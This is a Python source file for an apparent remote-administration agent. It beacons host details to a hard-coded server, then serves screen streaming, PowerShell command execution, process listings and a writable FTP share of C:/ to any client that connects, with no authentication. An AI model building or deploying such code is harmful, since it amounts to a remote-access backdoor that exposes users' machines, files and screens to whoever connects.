import logging
import socket
import ssl
import sys
import traceback

import lz4.frame
from getmac import get_mac_address as gma
import random
from screeninfo import get_monitors
from threading import Thread
from mss import mss
import subprocess
import threading
import os
from pyftpdlib.servers import FTPServer
from pyftpdlib.authorizers import WindowsAuthorizer
import pyftpdlib.handlers
from OpenSSL import SSL

HOST = "192.168.2.75"  # The server's hostname or IP address
PORT = 65432  # The port used by the server

result = ""
process_list = ""
list_of_ports = range(20000, 60000)


def return_not_used_port():
    starting_port = 0
    port = random.choice(list_of_ports)
    while starting_port == 0:
        if is_port_in_use(port):
            port = random.choice(list_of_ports)
        else:
            starting_port = port

    return port


def is_port_in_use(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0


def start_listening_for_commands(running_port):
    send_computer_information(running_port)


def send_computer_information(running_port):
    #context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    #context.load_verify_locations('../certificates2/public.pem')

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        #with context.wrap_socket(sock, server_hostname="HOST") as ssock:
            #print(ssock.version())
            #ssock.connect((HOST, PORT))
            sock.connect((HOST, PORT))
            hostname = socket.getfqdn()
            # Wait to see if workes with outside lan connection
            ip_address = socket.gethostbyname(hostname)
            mac_address = gma()
            width, height = get_screen_width_height()
            data_to_send = [hostname, ip_address, str(running_port), mac_address, str(width), str(height)]
            encoded_data = '||'.join(data_to_send).encode()
            sock.sendall(encoded_data)
            sock.close()


def get_screen_width_height():
    width = ""
    height = ""
    for monitor in get_monitors():
        # print(str(monitor))
        # FOR TESTING THE PRIMARY MONITOR IS FALSE ( SECOND SCREEN )
        if str(monitor.is_primary) == "True":
            width = monitor.width
            height = monitor.height

    return width, height


def retreive_screen(conn, width, height):
    with mss() as mss_instance:
        recording_area = {'top': 0, 'left': 0, 'width': width, 'height': height}
        # Retrieve monitor instead of a specific area
        monitor_1 = mss_instance.monitors[1]

        while "recording":
            # Grab the screen with the dimensions of the recording_area
            image = mss_instance.grab(monitor_1)

            # Compresses the image data with lz4 compressing algorithm
            pixels = lz4.frame.compress(image.rgb)

            # Send the size of the pixels length
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))

            # Send the actual pixels length
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)

            # Send pixels
            conn.sendall(pixels)


def socket_listening(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))

        try:
            sock.listen(5)
            print('Server started.')

            while 'connected':
                if not 'connected':
                    conn.close()

                conn, addr = sock.accept()
                print('Client connected IP:', addr)
                width, height = get_screen_width_height()
                thread = Thread(target=retreive_screen, args=(conn, width, height))
                thread.start()


        finally:
            conn.close()

            # sock.close()


def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf


def run_command(command):
    command_result = subprocess.run(["powershell", "-Command", command], capture_output=True)
    global result
    result = command_result.stdout
    return command_result.stdout


def command_line_service(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))

        try:
            sock.listen(5)
            print('Server started.')
            conn, addr = sock.accept()
            print('Client connected IP:', addr)

            while 'connected':
                command = conn.recv(1024)
                thread = Thread(target=run_command, args=(command,))
                thread.start()
                thread.join()
                global result

                # Send the size of the pixels length
                size = len(result)
                size_len = (size.bit_length() + 7) // 8
                conn.send(bytes([size_len]))

                # Send the actual pixels length
                size_bytes = size.to_bytes(size_len, 'big')
                conn.send(size_bytes)

                conn.sendall(result)

        finally:
            conn.close()

def return_process_list():
    # using command line to return the process list
    global process_list
    process_list = os.popen('wmic process get description, processid').read()
    return os.popen('wmic process get description, processid').read()


def process_list_service(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        try:
            sock.listen()
            print('Server started.')
            conn, addr = sock.accept()
            print('Client connected IP:', addr)

            while 'connected':
                data = conn.recv(1024)
                if data.decode() == "processes":
                    thread = Thread(target=return_process_list)
                    thread.start()
                    thread.join()
                    global process_list
                    size = len(process_list)
                    size_len = (size.bit_length() + 7) // 8
                    conn.send(bytes([size_len]))

                    # Send the actual pixels length
                    size_bytes = size.to_bytes(size_len, 'big')
                    conn.send(size_bytes)

                    conn.sendall(process_list.encode())
                    print(process_list)

        finally:
            conn.close()

def sftp_server_start(conn, ipaddress, port):
    ## Create DummyUsers to not use windowsAuth
    authorizer = WindowsAuthorizer(allowed_users=["Shw"])
    authorizer.override_user("Shw", homedir='C:/', perm="elradfmw")
    handler = pyftpdlib.handlers.TLS_FTPHandler
    handler.certfile = 'keycert.pem'
    handler.authorizer = authorizer
    # requires SSL for both control and data channel
    # handler.tls_control_required = True
    # handler.tls_data_required = True
    server = FTPServer((ipaddress, port), handler)
    conn.sendall("Started".encode())
    server.serve_forever()



def handle_connections_for_functionalities(host, port):
    #context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    #context.load_cert_chain('/path/to/private.pem', '/path/to/privateKey.key')

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        try:
            sock.listen(5)
            print('Server started.')
            while 'connected':
                #with context.wrap_socket(sock, server_side=True) as ssock:
                    #conn, addr = ssock.accept()
                    conn, addr = sock.accept()
                    print('Client connected IP:', addr)
                    data = conn.recv(1024)
                    if data.decode() == "remote_desktop":
                        if not 'connected':
                            conn.close()

                        print('Client connected IP:', addr)
                        width, height = get_screen_width_height()
                        thread = Thread(target=retreive_screen, args=(conn, width, height))
                        thread.start()

                    elif data.decode() == "command_line":
                        command = conn.recv(1024)
                        thread = Thread(target=run_command, args=(command,))
                        thread.start()
                        thread.join()
                        global result

                        # Send the size of the pixels length
                        size = len(result)
                        size_len = (size.bit_length() + 7) // 8
                        conn.send(bytes([size_len]))

                        # Send the actual pixels length
                        size_bytes = size.to_bytes(size_len, 'big')
                        conn.send(size_bytes)

                        conn.sendall(result)

                    elif data.decode() == "processes":
                        thread = Thread(target=return_process_list)
                        thread.start()
                        thread.join()
                        global process_list
                        size = len(process_list)
                        size_len = (size.bit_length() + 7) // 8
                        conn.send(bytes([size_len]))

                        # Send the actual pixels length
                        size_bytes = size.to_bytes(size_len, 'big')
                        conn.send(size_bytes)

                        conn.sendall(process_list.encode())
                        print(process_list)

                    elif data.decode() == "sftp_server":
                        try:

                            thread = Thread(target=sftp_server_start(conn, host, "2221"))
                            thread.start()
                            thread.join()


                        except Exception as e:
                            logging.error(traceback.format_exc())

        finally:
            conn.close()

def main():
    running_port = return_not_used_port()
    running_port = 6666

    # RUN THREAD (with connection timeout and retry)
    send_computer_information(running_port)
    # width, height = get_screen_width_height()

    # Maybe run all functionalities on different threads

    #socket_listening("192.168.2.75", running_port)
    #command_line_service("192.168.2.75", running_port)
    #process_list_service("0.0.0.0", running_port)
    handle_connections_for_functionalities("192.168.2.75", running_port)

if __name__ == '__main__':
    main()
